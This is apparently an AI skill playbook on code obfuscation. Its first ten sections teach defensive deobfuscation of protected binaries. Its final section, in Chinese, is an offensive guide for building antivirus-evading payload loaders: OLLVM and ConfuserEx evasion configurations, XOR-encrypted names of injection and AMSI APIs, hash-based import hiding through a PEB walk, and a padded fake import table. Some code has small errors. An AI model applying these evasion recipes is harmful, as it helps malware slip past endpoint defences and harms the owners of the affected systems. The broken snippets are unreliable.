---
name: code-obfuscation-deobfuscation
description: >-
  Code obfuscation & deobfuscation — both attack and defense perspectives. Use for: (1) REVERSE: identifying and defeating obfuscation in protected binaries; (2) OFFENSIVE: implementing compiler-level obfuscation (OLLVM), .NET obfuscation (ConfuserEx), string encryption, IAT hiding, and PE header modification for AV evasion.
---

# SKILL: Code Obfuscation & Deobfuscation — Expert Analysis Playbook

> **AI LOAD INSTRUCTION**: Expert techniques for identifying, classifying, and defeating code obfuscation in native binaries. Covers junk code, opaque predicates, SMC, control flow flattening, movfuscator, VM protectors (VMProtect/Themida/Code Virtualizer), string encryption, import hiding, and anti-disassembly tricks. Base models often conflate packing with obfuscation and miss the distinction between static and dynamic deobfuscation strategies.

## 0. RELATED ROUTING

- [av-evasion-orchestrator](../av-evasion-orchestrator/SKILL.md) — 免杀决策入口（当混淆用于免杀目的时，orchestrator 会路由到本 skill §11 攻击视角）
- [anti-debugging-techniques](../anti-debugging-techniques/SKILL.md) when the obfuscated binary also has anti-debug layers
- [symbolic-execution-tools](../symbolic-execution-tools/SKILL.md) when using angr/Z3 for automated deobfuscation
- [vm-and-bytecode-reverse](../vm-and-bytecode-reverse/SKILL.md) for deep VM protector bytecode analysis

### Quick identification picks

| Symptom in IDA/Ghidra | Likely Obfuscation | Start With |
|---|---|---|
| Flat CFG, single giant switch | Control flow flattening | Symbolic execution to recover CFG |
| Only `mov` instructions | movfuscator | demovfuscation / trace-based lifting |
| pushad/pushfd → VM entry | VM protector | Handler table extraction |
| XOR loop before code execution | SMC / string encryption | Dynamic analysis, breakpoint after decode |
| Impossible conditions (opaque predicates) | Junk code insertion | Pattern-based removal |
| All strings unreadable | String encryption | Hook decryption routine, or emulate |
| No imports in IAT | Import hiding | Trace GetProcAddress / hash resolution |

---

## 1. JUNK CODE & OPAQUE PREDICATES

### 1.1 Junk Code Insertion

Dead code that never affects program output, added to increase analysis time.

**Identification**:
- Instructions that write to registers/memory never read afterward
- Function calls whose return values are discarded and have no side effects
- Loops with invariant bounds that compute unused results

**Removal strategy**:
1. Compute def-use chains (IDA/Ghidra data flow analysis)
2. Mark instructions with no downstream use as dead
3. Verify removal doesn't change program behavior (trace comparison)

### 1.2 Opaque Predicates

Conditional branches where the condition is always true or always false, but this is non-obvious.

| Type | Example | Always Evaluates To |
|---|---|---|
| Arithmetic | `x² ≥ 0` | True |
| Number theory | `x*(x+1) % 2 == 0` | True (product of consecutive ints) |
| Pointer-based | `ptr == ptr` after aliasing | True |
| Hash-based | `CRC32(constant) == known_value` | True |

**Deobfuscation**:
- Abstract interpretation: prove the condition is constant
- Symbolic execution: Z3 proves `∀x: predicate(x) = True`
- Pattern matching: recognize known opaque predicate families
- Dynamic: trace and observe the branch is never taken / always taken

```python
import z3
x = z3.BitVec('x', 32)
s = z3.Solver()
s.add(x * (x + 1) % 2 != 0)
print(s.check())  # unsat → always true
```

---

## 2. SELF-MODIFYING CODE (SMC)

Runtime code patching: encrypted code is decrypted just before execution.

### 2.1 XOR Decryption Loop (Most Common)

```asm
lea esi, [encrypted_code]
mov ecx, code_length
mov al, xor_key
decrypt_loop:
    xor byte [esi], al
    inc esi
    loop decrypt_loop
    jmp encrypted_code  ; now decrypted
```

### 2.2 Analysis Strategy

```
1. Identify the decryption routine (look for XOR/ADD/SUB in loops writing to .text)
2. Set breakpoint AFTER the loop completes
3. At breakpoint: dump the decrypted memory region
4. Re-analyze the dumped code in IDA/Ghidra
5. For multi-layer: repeat for each decryption stage
```

### 2.3 Automated Unpacking via Emulation

```python
from unicorn import *
from unicorn.x86_const import *

mu = Uc(UC_ARCH_X86, UC_MODE_32)
mu.mem_map(0x400000, 0x10000)
mu.mem_write(0x400000, binary_code)
mu.emu_start(decrypt_entry, decrypt_end)
decrypted = mu.mem_read(code_start, code_length)
```

---

## 3. CONTROL FLOW FLATTENING (CFF)

### 3.1 Structure

Original sequential blocks are transformed into a dispatcher loop:

```
Original:      A → B → C → D

Flattened:     ┌──────────────────┐
               │   dispatcher     │
               │   switch(state)  │◄─────┐
               ├──────────────────┤      │
               │ case 1: block A  │──────┤
               │ case 2: block B  │──────┤
               │ case 3: block C  │──────┤
               │ case 4: block D  │──────┘
               └──────────────────┘
```

Each block sets `state = next_state` before jumping back to the dispatcher.

### 3.2 Recovery Techniques

| Technique | Tool | Effectiveness |
|---|---|---|
| Symbolic execution | angr, Triton, miasm | High — traces all state transitions |
| Trace-based recovery | Pin/DynamoRIO trace → reconstruct CFG | Medium — covers executed paths only |
| Pattern matching | Custom IDA/Ghidra script | Medium — works for known flatteners |
| D-810 (IDA plugin) | IDA Pro | High — specifically designed for CFF |

### 3.3 Symbolic Deflattening (angr approach)

```python
import angr, claripy

proj = angr.Project('./obfuscated')
cfg = proj.analyses.CFGFast()

# Find dispatcher block (highest in-degree basic block)
dispatcher = max(cfg.graph.nodes(), key=lambda n: cfg.graph.in_degree(n))

# For each case block, symbolically determine successor
for block in case_blocks:
    state = proj.factory.blank_state(addr=block.addr)
    # ... solve state variable to find real successor
```

---

## 4. MOVFUSCATOR

### 4.1 Concept

All computation reduced to `mov` instructions only (Turing-complete via memory-mapped computation tables). Created by Christopher Domas.

### 4.2 Identification

- Function contains only `mov` instructions (no add, sub, xor, jmp, call)
- Large lookup tables in data section
- Memory-mapped flag registers

### 4.3 Demovfuscation

| Approach | Description |
|---|---|
| demovfuscator (tool) | Static analysis, recovers original operations from mov patterns |
| Trace + taint analysis | Run with Pin/DynamoRIO, taint inputs, observe computation |
| Symbolic execution | Treat entire function as constraint system |

---

## 5. VM PROTECTION (VMProtect / Themida / Code Virtualizer)

### 5.1 VM Architecture

```
Protected code → bytecode compiler → custom bytecode
Runtime: VM entry (pushad/pushfd) → fetch → decode → execute → VM exit (popad/popfd)
```

### 5.2 VM Entry Point Identification

```asm
; Typical VMProtect entry
pushad                    ; save all registers
pushfd                    ; save flags
mov ebp, esp              ; VM stack frame
sub esp, VM_LOCALS_SIZE   ; allocate VM context
mov esi, bytecode_addr    ; bytecode instruction pointer
jmp vm_dispatcher         ; enter VM loop
```

### 5.3 Handler Table Extraction

```
1. Find dispatcher (large switch or indirect jump via table)
2. Each case/entry = one VM handler (implements one VM opcode)
3. Map handler addresses to operations by analyzing each handler:
   - Handler reads operand from bytecode stream (esi)
   - Performs operation on VM registers/stack
   - Advances bytecode pointer
   - Returns to dispatcher
```

### 5.4 Devirtualization Approaches

| Method | Description | Tool |
|---|---|---|
| Manual handler mapping | Reverse each handler, build ISA spec | IDA + scripting |
| Trace recording | Record all handler executions, reconstruct program | REVEN, Pin |
| Symbolic lifting | Symbolically execute handlers, lift to IR | Triton, miasm |
| Pattern matching | Match handler patterns to known VM families | Custom scripts |

### 5.5 VMProtect Specifics

- Uses opaque predicates in dispatcher
- Handler mutation: same opcode, different handler code per build
- Multiple VM layers (VM inside VM)
- Integrates anti-debug and integrity checks

---

## 6. STRING ENCRYPTION

### 6.1 Common Patterns

| Pattern | Example | Recovery |
|---|---|---|
| XOR loop | `for (i=0; i<len; i++) s[i] ^= key;` | Hook or emulate XOR function |
| Stack strings | `mov [esp+0], 'H'; mov [esp+1], 'e'; ...` | IDA FLIRT / Ghidra script to reassemble |
| RC4 encrypted | Encrypted blob + RC4 key in binary | Extract key, decrypt offline |
| AES encrypted | Encrypted blob + AES key derived at runtime | Hook after decryption |
| Custom encoding | Base64 + XOR + reverse | Trace the decode function, replicate |

### 6.2 Automated String Decryption

```python
# Ghidra script: find XOR decryption calls, emulate them
from ghidra.program.model.symbol import SourceType

decrypt_func = getFunction("decrypt_string")
refs = getReferencesTo(decrypt_func.getEntryPoint())

for ref in refs:
    call_addr = ref.getFromAddress()
    # extract arguments (encrypted buffer ptr, key, length)
    # emulate decryption, add comment with plaintext
```

---

## 7. IMPORT HIDING

### 7.1 GetProcAddress + Hash Lookup

```c
FARPROC resolve(DWORD hash) {
    // Walk PEB → LDR → InMemoryOrderModuleList
    // For each DLL, walk export table
    // Hash each export name, compare with target hash
    // Return matching function pointer
}
```

### 7.2 Recovery

1. Identify the hash algorithm (common: CRC32, djb2, ROR13+ADD)
2. Compute hashes for all known API names
3. Build hash → API name lookup table
4. Annotate resolved calls in IDA/Ghidra

### 7.3 Common Hash Algorithms

| Name | Algorithm | Used By |
|---|---|---|
| ROR13 | `hash = (hash >> 13 \| hash << 19) + char` | Metasploit shellcode |
| djb2 | `hash = hash * 33 + char` | Various malware |
| CRC32 | Standard CRC32 of function name | Sophisticated packers |
| FNV-1a | `hash = (hash ^ char) * 0x01000193` | Modern malware |

---

## 8. ANTI-DISASSEMBLY TRICKS

### 8.1 Techniques

| Trick | Mechanism | Fix |
|---|---|---|
| Overlapping instructions | `jmp $+2; db 0xE8` (fake call prefix) | Manual re-analysis from correct offset |
| Misaligned jumps | Jump into middle of multi-byte instruction | Force IDA to re-analyze at target |
| Conditional jump pair | `jz $+5; jnz $+3` (always jumps, confuses linear disasm) | Convert to unconditional jmp |
| Return address manipulation | `push addr; ret` instead of `jmp addr` | Recognize push+ret as jump |
| Exception-based flow | Trigger exception, real code in handler | Analyze exception handler chain |
| Call + add [esp] | `call $+5; add [esp], N; ret` (computed jump) | Calculate actual target |

### 8.2 IDA Fixes

```
Right-click → Undefine (U)
Right-click → Code (C) at correct offset
Edit → Patch → Assemble (for permanent fix)
```

---

## 9. DECISION TREE

```
Obfuscated binary — how to approach?
│
├─ Can you run it?
│  ├─ Yes → Dynamic analysis first
│  │  ├─ Set BP on interesting APIs (file, network, crypto)
│  │  ├─ Trace execution to understand real behavior
│  │  └─ Dump decrypted code/strings at runtime
│  │
│  └─ No (embedded/firmware/exotic arch) → Static only
│     └─ Identify obfuscation type from patterns below
│
├─ What does the code look like?
│  │
│  ├─ Giant flat switch/dispatcher loop?
│  │  ├─ State variable drives control flow → CFF
│  │  │  └─ Use D-810 or symbolic deflattening
│  │  └─ Bytecode fetch-decode-execute → VM protection
│  │     └─ Extract handlers, build disassembler
│  │
│  ├─ Only mov instructions?
│  │  └─ movfuscator → demovfuscator tool
│  │
│  ├─ XOR/ADD loop writing to .text section?
│  │  └─ SMC → breakpoint after decode, dump
│  │
│  ├─ Impossible conditions in branches?
│  │  └─ Opaque predicates → Z3 proving or pattern removal
│  │
│  ├─ Disassembly looks wrong / functions overlap?
│  │  └─ Anti-disassembly → manual re-analysis at correct offsets
│  │
│  ├─ No readable strings?
│  │  └─ String encryption → hook decrypt function or emulate
│  │
│  ├─ No imports in IAT?
│  │  └─ Import hiding → identify hash, build lookup table
│  │
│  └─ pushad/pushfd → complex code → popad/popfd?
│     └─ VM protector entry/exit → full VM analysis
│
└─ What tool to use?
   ├─ Known protector (VMProtect/Themida) → specific deprotection guide
   ├─ Custom obfuscation → combine: IDA scripting + Triton + manual
   ├─ CTF challenge → angr symbolic execution often fastest
   └─ Malware analysis → dynamic (debugger + API monitor) first
```

---

## 10. TOOLBOX

| Tool | Purpose | Best For |
|---|---|---|
| IDA Pro + Hex-Rays | Disassembly, decompilation, scripting | All-around analysis |
| Ghidra | Free alternative with scripting (Java/Python) | Budget-friendly RE |
| D-810 (IDA plugin) | Automated CFF deflattening | OLLVM-style obfuscation |
| miasm | IR-based analysis framework | Symbolic deobfuscation |
| Triton | Dynamic symbolic execution | Opaque predicate solving, CFF |
| REVEN | Full-system trace recording and replay | VM protector analysis |
| demovfuscator | movfuscator reversal | mov-only binaries |
| x64dbg + plugins | Dynamic analysis with scripting | Windows RE |
| Unicorn Engine | CPU emulation | SMC unpacking, shellcode |
| Capstone | Disassembly library | Custom tooling |
| IDA FLIRT | Function signature matching | Identify library code in stripped binaries |
| Binary Ninja | Alternative disassembler with MLIL/HLIL | Automated analysis |

---
## 11. OFFENSIVE OBFUSCATION — Implementation Guide

> **定位**: 前面章节教你**如何分析/去除混淆**（逆向），本章教你**如何实施混淆**（免杀攻击视角）。本章为 av-evasion-orchestrator 的子章节，用于生成免杀 Payload。

### 11.1 OLLVM (Obfuscator-LLVM) — 编译配置与 Pass 选择

OLLVM 是基于 LLVM 的代码混淆编译器，在编译阶段插入混淆 Pass，生成语义等价但二进制特征完全不同的代码。

#### 安装与使用

```bash
# 克隆 OLLVM（推荐 fork: https://github.com/heroims/obfuscator 支持 LLVM 14.0+）
git clone https://github.com/heroims/obfuscator.git
cd obfuscator && mkdir build && cd build
cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=OFF ../llvm
make -j$(nproc)
```

#### 四大 Pass 详解与选择策略

| Pass | 标志 | 混淆效果 | 性能开销 | 免杀价值 | 使用建议 |
|---|---|---|---|---|---|
| **控制流平坦化** | `-mllvm -fla` | 函数拆散为 switch-case 主分发器 | 中（~30%） | ★★★★★ | 必开，360/火绒最怕这个 |
| **指令替换** | `-mllvm -sub` | 算术/逻辑指令替换为语义等价序列 | 低（~10%） | ★★★★ | 必开，破坏静态特征码最直接 |
| **虚假控制流** | `-mllvm -bcf` | 插入永不执行的虚假分支（不透明谓词） | 中（~20%） | ★★★★ | 必开，使 CFG 分析复杂度暴增 |
| **字符串加密** | `-mllvm -sobf` | 编译时加密所有字符串，运行时动态解密 | 低（~5%） | ★★★★★ | 必开，直接干掉字符串扫描检测 |

#### 推荐编译配置（实战黄金配方）

```bash
# ─── 免杀标准配置（平衡性能与混淆强度）───
x86_64-w64-mingw32-clang++ -O2 \
    -mllvm -fla \                     # 控制流平坦化
    -mllvm -sub \                     # 指令替换
    -mllvm -bcf \                     # 虚假控制流
    -mllvm -bcf_loop=3 \              # BCF 循环次数（默认1，建议3）
    -mllvm -bcf_prob=40 \             # BCF 概率 40%（默认30）
    -mllvm -sobf \                    # 字符串加密
    loader.c -o loader.exe

# ─── 极端混淆配置（性能换安全）───
x86_64-w64-mingw32-clang++ -O1 \
    -mllvm -fla \
    -mllvm -split \                   # 基本块拆分（可选，配合 fla）
    -mllvm -split_num=3 \             # 每块拆分为3块
    -mllvm -sub \
    -mllvm -sub_loop=3 \              # 指令替换循环3次
    -mllvm -bcf \
    -mllvm -bcf_loop=3 \
    -mllvm -bcf_prob=50 \
    -mllvm -sobf \
    loader.c -o loader_extreme.exe

# ─── 轻量混淆（快速验证用）───
x86_64-w64-mingw32-clang++ -O2 \
    -mllvm -sub \
    -mllvm -sobf \
    loader.c -o loader_lite.exe
```

**踩坑提示**: 
- 360 对 MSVC 的 `/O2 + /Ob2` 优化有特征 → OLLVM 编译可完全避开
- 部分杀软对 OLLVM 编译产物的高熵值敏感 → 混入正常代码（printf、合法 API 调用）降低熵
- 不要在 `-O0` 下使用 OLLVM → 混淆前先优化（`-O1` 及以上）

### 11.2 ConfuserEx — .NET 混淆预设与自定义规则

```xml
<!-- ConfuserEx 免杀配置模板 (confuser.cr) -->
<project outputDir="obfuscated" baseDir="src">
    <module path="tool.exe">
        <!-- 1. 重命名混淆：所有类/方法/字段用不可读字符重命名 -->
        <rule pattern="true" inherit="false">
            <protection id="rename" />
        </rule>

        <!-- 2. 控制流混淆：破坏 IL 逻辑结构 -->
        <rule pattern="true">
            <protection id="ctrl flow">
                <argument name="intensity" value="70" />  <!-- 强度 70% -->
            </protection>
        </rule>

        <!-- 3. 常量加密：隐藏内联字符串和常量 -->
        <rule pattern="true">
            <protection id="constants" />
        </rule>

        <!-- 4. 资源加密：加密嵌入的 DLL/配置文件 -->
        <rule pattern="true">
            <protection id="resources" />
        </rule>

        <!-- 5. 反调试：检测调试器附加 -->
        <rule pattern="true">
            <protection id="anti debug" />
        </rule>

        <!-- 6. 反篡改：检测二进制修改 -->
        <rule pattern="true">
            <protection id="anti tamper" />
        </rule>

        <!-- 7. 无效元数据注入：灌入大量垃圾元数据 -->
        <rule pattern="true">
            <protection id="invalid metadata" />
        </rule>

        <!-- 8. 反射保护：隐藏反射调用 -->
        <rule pattern="true">
            <protection id="ref proxy" />
        </rule>
    </module>
</project>
```

```bash
# 运行混淆
Confuser.CLI.exe -n confuser.cr
```

### 11.3 字符串加密 — 实现模板

手动实现的字符串加密/解密，不依赖编译器 Pass，可嵌入任意项目：

```c
/**
 * 编译时字符串加密宏（C/C++）
 * 使用 XOR + 编译期常量，不留明文字符串在二进制中
 *
 * 使用: USE_ENCRYPTED_STRING("VirtualAlloc")
 * 展开为: DecryptString("\x2A\x4B\x1C...", key)
 */

// 简单 XOR 加密/解密
static __forceinline void XorDecrypt(char *data, size_t len, char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// 使用 EncryptedString 结构体自动解密
typedef struct {
    char *data;
    size_t len;
    char key;
} EncryptedString;

char *DecryptString(EncryptedString *es) {
    char *plain = (char *)malloc(es->len + 1);
    memcpy(plain, es->data, es->len);
    XorDecrypt(plain, es->len, es->key);
    plain[es->len] = '\0';
    return plain;  // 调用方负责 free
}

// 预加密字符串（由 Python 脚本生成）:
// key = rand_byte, encrypted = bytes([b ^ key for b in b"VirtualAlloc"])
```

```python
# 字符串预加密脚本（编译前运行）
# 输出 C 头文件，包含所有加密字符串

import os, sys

STRINGS_TO_ENCRYPT = [
    "VirtualAlloc", "CreateThread", "WriteProcessMemory",
    "kernel32.dll", "ntdll.dll", "NtAllocateVirtualMemory",
    "amsi.dll", "AmsiScanBuffer",
]

def encrypt_string(s):
    key = ord(os.urandom(1))
    encrypted = ','.join(f'0x{b ^ key:02X}' for b in s.encode())
    return f'{{(char[]){encrypted}, {len(s)}, 0x{key:02X}}}'

print("// Auto-generated encrypted strings")
for s in STRINGS_TO_ENCRYPT:
    print(f"static EncryptedString _s_{s} = {encrypt_string(s)};")
```

### 11.4 IAT 隐藏 — 完整实现

隐藏导入表 (Import Address Table) 使静态分析工具看不到敏感 API 调用：

#### 方案 A: API 哈希化动态解析

```c
/**
 * 通过 DJB2 哈希动态解析 API 地址
 * 不在导入表中出现敏感函数名
 */

DWORD Djb2Hash(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;  // hash * 33 + c
    }
    return hash;
}

FARPROX GetProcAddressByHash(HMODULE hModule, DWORD dwHash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)
        ((BYTE *)hModule + pDos->e_lfanew);

    DWORD dwExportRVA = pNt->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!dwExportRVA) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExport =
        (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hModule + dwExportRVA);

    PDWORD pNames = (PDWORD)((BYTE *)hModule + pExport->AddressOfNames);
    PWORD pOrdinals = (PWORD)((BYTE *)hModule + pExport->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)((BYTE *)hModule + pExport->AddressOfFunctions);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char *pszName = (const char *)((BYTE *)hModule + pNames[i]);
        if (Djb2Hash(pszName) == dwHash) {
            return (FARPROC)((BYTE *)hModule + pFunctions[pOrdinals[i]]);
        }
    }
    return NULL;
}

// 预计算哈希值（编译前运行）:
// printf("VirtualAlloc:  0x%08X\n", Djb2Hash("VirtualAlloc"));
// printf("CreateThread:  0x%08X\n", Djb2Hash("CreateThread"));

// 使用:
HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
pVirtualAlloc fnAlloc = (pVirtualAlloc)
    GetProcAddressByHash(hKernel32, 0x91AFCA54);  // DJB2("VirtualAlloc")
```

#### 方案 B: 延迟导入 + 手动解析

```c
/**
 * 完全移除特定 DLL 的导入条目，改为运行时手动加载
 * 优点: 导入表中不出现 kernel32.dll → 静态分析看不到任何高危 API
 * 实现: 通过 PEB 获取 kernel32 基址 → 手动解析导出表定位函数
 */

HMODULE GetKernel32Base() {
    // 通过 PEB 的 InMemoryOrderModuleList 获取
    // kernel32.dll 总是在 ntdll.dll 之后加载（第2个条目）
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink->Flink;  // 跳过自身 → ntdll → kernel32

    PLDR_DATA_TABLE_ENTRY pEntry =
        CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return (HMODULE)pEntry->DllBase;
}
```

#### 方案 C: 伪造合法导入表

```c
/**
 * 在 PE 导入表中添加大量合法导入（如 user32.dll、gdi32.dll 的数百个函数）
 * 使敏感导入（kernel32!VirtualAlloc）被淹没在噪音中
 * 实现: 使用 Python pefile 库脚本修改 PE
 */

# Python 脚本: 伪造导入表
import pefile
pe = pefile.PE("loader.exe")
# 添加来自 user32.dll 的 200+ 个合法导入
# 真实敏感 API 通过 §11.4 方案 A 动态解析
pe.write("loader_fake_imports.exe")
```

### 11.5 混淆方案速查（攻击视角）

| 目标 | 推荐工具 | 命令/配置 | 免杀效果 |
|---|---|---|---|
| C/C++ 编译器级混淆 | OLLVM | `clang -mllvm -fla -mllvm -sub -mllvm -bcf -mllvm -sobf` | ★★★★★ |
| .NET 全功能混淆 | ConfuserEx | config 含 rename+ctrlflow+constants+resources | ★★★★ |
| 字符串隐藏 | 手动 XOR/AES 加密宏 | 编译前 Python 加密脚本 + 运行时解密 | ★★★★★ |
| IAT 隐藏 | API 哈希化 | DJB2/CRC32 哈希 + PEB 遍历导出表 | ★★★★★ |
| PE 头修改 | Python pefile / C 手动修改 | Section 重命名 + Rich Header 清除 + 时间戳伪造 | ★★★☆ |
| Go 二进制混淆 | garble | `garble -literals -tiny build` | ★★★☆ |
| 运行时自修改 (SMC) | 手动实现 | 加密 .text 段 + 执行前解密 + 执行后加密 | ★★★★ |
